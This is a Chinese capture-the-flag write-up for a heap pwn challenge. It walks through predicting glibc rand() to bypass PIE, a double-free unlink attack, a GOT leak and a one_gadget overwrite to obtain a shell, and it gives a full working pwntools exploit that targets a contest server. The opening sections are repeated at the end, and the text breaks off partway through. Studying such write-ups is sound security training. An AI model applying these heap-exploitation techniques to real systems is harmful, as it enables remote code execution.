
# [原创]第四题 WriteUp

## 程序流程分析

一个非常经典的文本管理，可以分配和管理空间，并向空间中写入文本。

另外，附带一个猜随机数的小游戏，猜对了可以获取随机种子（的地址）。

// 此程序中这两个是相等的

## 漏洞分析

在删除已有的 `box` 时 `free` 掉了 `box` 指向的堆地址，但未将指针本身清零，故存在 `Double Free` 和 `Use After Free` 漏洞。

## 第一步：取得程序地址偏移量

程序开启了全局 `PIE`，地址完全随机，故必须先取得程序基地址。

分析程序，发现之前的猜随机数小游戏猜对了可以输出随机种子的地址，而本题中的随机种子为一个 `data` 段的全局变量，相对程序基址的偏移已知，故可以通过获取这个地址来获取程序基址。

关于 `Glibc` 的 `rand()` 函数，查阅以下文章：

<mark class="encrypted">812K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2K6j5%4y4Q4x3X3g2V1j5h3I4Q4x3X3g2U0j5g2)9J5c8W2)9%4c8i4y4W2L8r3W2F1k6$3g2J5i4K6u0r3M7X3q4F1k6r3!0E0i4K6u0r3</mark>

`rand()` 函数的一个简单复现：

```c
#include <stdio.h>
#define MAX 1000
#define seed 1
main() {
int r[MAX];
int i;
r[0] = seed;
for (i=1; i<31; i++) {
r[i] = (16807LL \* r[i-1]) % 2147483647;
if (r[i] < 0) {
r[i] += 2147483647;
}
}
for (i=31; i<34; i++) {
r[i] = r[i-31];
}
for (i=34; i<344; i++) {
r[i] = r[i-31] + r[i-3];
}
for (i=344; i<MAX; i++) {
r[i] = r[i-31] + r[i-3];
printf("%d\n", ((unsigned int)r[i]) >> 1);
}
}
```

由此可知，在一个确定的随机种子下的序列中，下一个随机数的生成公式为：

```text
randlist[l] = (randlist[l-3]+randlist[l-31]) % 2147483648
```

而在此程序中，若猜错随机数，则会输出正确的随机数，故可以通过故意猜错来获取足够长的随机数序列，从而预测下一个随机数的值。

猜到了正确的随机数后，获取到了 `seed` 变量的真实地址，减去偏移量 `0x202148`，即得到了程序的基地址。

```python
def guessRandomNumber():
print "[+] Gathering random sequence......"
randlist = []
for i in range(50):
p.recvuntil('>')
p.sendline('5')
p.recvuntil('>')
p.sendline('-1')
p.recvuntil('Wr0ng answer!The number is ')
num = p.recvuntil('!')[:-1]
randlist.append(int(num))
print "[+] Calculating the next random number......"
l = len(randlist)
randnum = (randlist[l-3]+randlist[l-31]) % 2147483648
print "[\*] Got the next random number: %d" % randnum
return randnum
def getPIEAddress(num):
print "[+] Getting the base address......"
p.recvuntil('>')
p.sendline('5')
p.recvuntil('>')
p.sendline(str(num))
p.recvuntil('G00dj0b!You get a secret: ')
addr = p.recvuntil('!')[:-1]
addr = int(addr) - 0x202148
print "[\*] Got the PIE offset: 0x%x" % addr
return addr
```

## 第二步：布置堆块，通过 `Double Free` 漏洞触发 `unlink` 宏获取指向指针列表的指针

关于 `unlink` 的原理可以参见以下文章：

<mark class="encrypted">7ccK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2U0M7$3c8F1i4K6u0W2L8X3g2@1i4K6u0r3M7i4q4Q4y4h3j5J5z5e0x3@1x3K6t1H3x3g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3y4e0x3#2y4e0R3J5x3e0j5`.</mark>

这个程序对堆块的大小有一个限制，从上到下的几个 `box`，后一个比前一个必须大 16 以上，且大小控制在 8 - `0x1000` 范围内。

另一个限制是，能够 `free` 的指针只有第二个和第三个 `box`。

为了使堆块连续分配，需要控制堆块的大小在同一个 `bin` 范围内，这里选择 `small bin` 范围。

先分配第二个和第三个 `box` 两个堆块，这里选择的大小为 128 和 144，然后再 `free` 第二块和第三块（此时指针仍然存在）。此时堆中的布局如下：

```text
--------------
| prev\_size |
--------------
| size |
ptr2-> --------------
| fd |
--------------
| bk |
--------------
| |
| (128 - 16 |
| bytes) |
--------------
| prev\_size |
--------------
| size |
ptr3-> --------------
| |
|(144 bytes) |
| |
| |
--------------
```

再分配第四个 `box`，大小为（128 + 144 + 16），为了将 `box2` 和 `box3` 的空间恰好完全覆盖。

为了触发 `unlink` 宏，需要通过检验：

```text
(p -> fd) -> bk == p
(p -> bk) -> fd == p
```

故选取 `data` 段 `box2` 指针向前偏移 `0x18` 作为伪 `fd`，向前 `0x10` 作为伪 `bk`。

（对应的为指针 list - 0x8，指针 list - 0x0。）

通过 `box4` 的指针去修改堆里的内容，现在堆里的布局如下：

```text
--------------
| prev\_size |
--------------
| size |
ptr2-> -------------- <-ptr4
|fakeprevsize|
--------------
| fake\_size |
--------------
| fake\_fd |
--------------
| fake\_bk |
--------------
| (128 - 32 |
| bytes) |
--------------
|fakeprevsize|
--------------
| fake\_size |
ptr3-> --------------
| |
|(144 bytes) |
| |
| |
--------------
```

`free box3` 指针，成功，触发 `unlink`，现在 `box2` 指针的值已经被修改为了指向指针列表 - 0x8 的位置。

## 第三步：通过修改指针的值泄露 GOT 表的信息，从而计算 `libc` 的基址

现在指针列表已经可控了，可以将没有用到的 `box1` 的指针修改为指向 GOT 表上地址的指针。

由于程序限制了必须先分配才可查看的设定，在修改之前先分配一个小一点的 `box1`，这里大小为 112。

通过 `box2` 指针来编辑指针列表，这里将 `box1` 的指针修改为 GOT 表上 `free` 函数的地址。（也可以是其他函数，但一定是要之前执行过的函数，由于延迟绑定，执行过的 GOT 表中才会存放真实地址。）

使用程序自带的 `show message` 功能查看 `box1` 中存放的内容，由于 `box1` 已被修改，故实际查看的是 GOT 表中 `free` 函数的地址。获取地址之后根据题目所给的 `libc` 文件，可以算出 `libc` 的基址。

## 第四步：通过修改 GOT 表实现控制流劫持从而 `get shell`

由 `one_gadget` 工具，根据提供的 `libc`，可以得到几个能够 `get shell` 的偏移，经测试选取 `0xf0274` 这个偏移。通过之前获取的 `libc` 基址可以算出 `one gadget RCE` 的真实地址。

通过再次修改 `box1` 指针指向的值（此时已经指向 GOT 表），将 `puts` 函数的 GOT 表修改为 `one gadget RCE` 的地址。（因为两根能 `free` 的指针一根被修改了，另一根已经过 `double free`，为了避免不必要的麻烦，不选择 `free` 函数的 GOT 表。）

控制程序任意 `puts` 一个字符串，触发 `one gadget RCE`，获得 shell。

## exp.py

```python
from pwn import \*
context(arch = "amd64", os = "linux")
#p = process('./club', env = {'LD\_PRELOAD': './libc.so.6'})
p = remote('123.206.22.95', 8888)
elf = ELF('./club')
libc = ELF('./libc.so.6')
def guessRandomNumber():
print "[+] Gathering random sequence......"
randlist = []
for i in range(50):
p.recvuntil('>')
p.sendline('5')
p.recvuntil('>')
p.sendline('-1')
p.recvuntil('Wr0ng answer!The number is ')
num = p.recvuntil('!')[:-1]
randlist.append(int(num))
print "[+] Calculating the next random number......"
l = len(randlist)
randnum = (randlist[l-3]+randlist[l-31]) % 2147483648
print "[\*] Got the next random number: %d" % randnum
return randnum
def getPIEAddress(num):
print "[+] Getting the base address......"
p.recvuntil('>')
p.sendline('5')
p.recvuntil('>')
p.sendline(str(num))
p.recvuntil('G00dj0b!You get a secret: ')
addr = p.recvuntil('!')[:-1]
addr = int(addr) - 0x202148
print "[\*] Got the PIE offset: 0x%x" % addr
return addr
print "[\*] Pediy CTF 2017 - Pwn - Club"
print "[\*] Exploit by acdxvfsvd"
print "[+] Bypassing the PIE......"
num = guessRandomNumber()
pieoffset = getPIEAddress(num)
buf\_list = pieoffset + 0x202100
print "[+] Allocating the heap......"
def allocate(index, length):
p.recvuntil('>')
p.sendline('1')
p.recvuntil('>')
p.sendline(str(index))
p.recvuntil('>')
p.sendline(str(length))
def destroy(index):
p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline(str(index))
def edit(index, buf):
p.recvuntil('>')
p.sendline('3')
p.recvuntil('>')
p.sendline(str(index))
p.recv()
p.sendline(buf)
def getmessage(index):
p.recvuntil('>')
p.sendline('4')
p.recvuntil('>')
p.sendline(str(index))
data = p.recvline()[1:-1]
return data
#allocate(1, 112)
allocate(2, 128)
edit(2, 'B' \* 128)
allocate(3, 144)
edit(3, 'C' \* 144)
destroy(2)
destroy(3)
allocate(4, 144 + 128 + 16)
print "[+] Filling heap chunks with payload......"
fd = buf\_list - 0x8
bk = buf\_list - 0x0
fake\_chunk = ''
fake\_chunk += p64(0) + p64(129) + p64(fd) + p64(bk) + 'a' \* (128 - 8 \* 4)
fake\_chunk += p64(128) + p64(160) + 'A' \* 144
edit(4, fake\_chunk)
print "[+] Triggering the unlink macro......"
destroy(3)
print "[\*] Got the unlinked pointer"
print "[+] Overwriting the chunk list......"
allocate(1, 112)
fake\_list = ''
#fake\_list += p64(0) \* 2
fake\_list += p64(pieoffset + elf.got['free']) \* 3
edit(2, fake\_list)
print "[+] Leaking the address of libc......"
free\_addr = u64(getmessage(1).ljust(8, '\x00'))
print "[\*] Got the address of free: 0x%x" % free\_addr
libc\_addr = free\_addr - libc.symbols['free']
print "[\*] Got the address of libc: 0x%x" % libc\_addr
print "[+] Overwriting the global offset table......"
one\_offset = 0xf0274
one\_addr = libc\_addr + one\_offset
fake\_got = p64(one\_addr) \* 3
edit(1, fake\_got)
print "[+] Now the function puts points to the one gadget RCE"
print "[+] Triggering the RCE......"
print "[\*] Got a shell!"
p.interactive()
```

![](upload/attach/201710/769221\_eqxl0aoranqzrzb.png)

## 程序流程分析

一个非常经典的文本管理，可以分配和管理空间，并向空间中写入文本。

另外，附带一个猜随机数的小游戏，猜对了可以获取随机种子（的地址）。

// 此程序中这两个是相等的

## 漏洞分析

在删除已有的 `box` 时 `free` 掉了 `box` 指向的堆地址，但未将指针本身清零，故存在 `Double Free` 和 `Use After Free` 漏洞。

## 第一步：取得程序地址偏移量

程序开启了全局 `PIE`，地址完全随机，故必须先取得程序基地址。

分析程序，发现之前的猜随机数小游戏猜对了可以输出随机种子的地址，而本题中的随机种子为一个 `data` 段的全局变量，相对程序基址的偏移已知，故可以通过获取这个地址来获取程序基址。

关于 `Glibc` 的 `rand()` 函数，查阅以下文章：

[d67K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2K6j5%4y4Q4x3X3g2V1j5h3I4Q4x3X3g2U0j5g2)9J5c8W2)9%4c8i4y4W2L8r3W2F1k6$3g2J5i4K6u0r3M7X3q4F1k6r3!0E0i4K6u0r3](https://bbs.kanxue.com/elink@7daK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2K6j5%4y4Q4x3X3g2V1j5h3I4Q4x3X3g2U0j5g2)9J5c8W2)9%4c8i4y4W2L8r3W2F1k6$3g2J5i4K6u0r3M7X3q4F1k6r3!0E0i4K6u0r3)

`rand()` 函数的一个简单复现：
